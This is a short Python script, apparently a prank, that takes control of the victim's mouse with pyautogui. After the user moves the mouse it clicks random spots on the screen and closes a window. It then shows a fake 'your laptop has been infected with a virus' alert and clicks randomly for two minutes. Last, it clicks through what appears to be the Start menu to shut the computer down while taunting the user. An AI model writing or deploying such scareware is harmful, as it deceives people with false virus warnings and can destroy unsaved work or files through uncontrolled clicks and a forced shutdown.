from pyautogui import*
from tkinter import*
import time
import random

root = Tk()


def current_position():
    return [root.winfo_pointerx(), root.winfo_pointery()]


def move_mouse(how_long_in_seconds):
    start_time = time.time()
    time_elapsed = time.time() - start_time
    xsize, ysize = size()

    while time_elapsed < how_long_in_seconds:
        x, y = random.randrange(xsize), random.randrange(ysize)
        click(x, y, duration=0.2)
        time_elapsed = time.time() - start_time


pos1 = current_position()
time.sleep(30)
counter = 0

while True:
    time.sleep(0.5)
    pos2 = current_position()
    if pos1 != pos2:
        while True:
            sleep(random.randint(0, 5))
            if counter < 15:
                click(random.randint(0, 1000), random.randint(0, 1000), duration=0.2)

            elif 15 <= counter < 17:
                click(1890, 11, duration=0.5)
                sleep(20)
            
            elif counter == 17:
                alert("Your laptop has been infected with a virus, click ok to scan and remove any viruses")
                move_mouse(120)

            elif counter > 17:
                alert("Have fun turning it back on again!")
                click(18, 1054, duration=0.5)
                time.sleep(0.5)
                click(28, 1004, duration=0.5)
                time.sleep(1)
                click(31, 898, duration=0.5)
                click(31, 898, duration=0.5)
                break
            counter += 1

            break
    pos1 = pos2
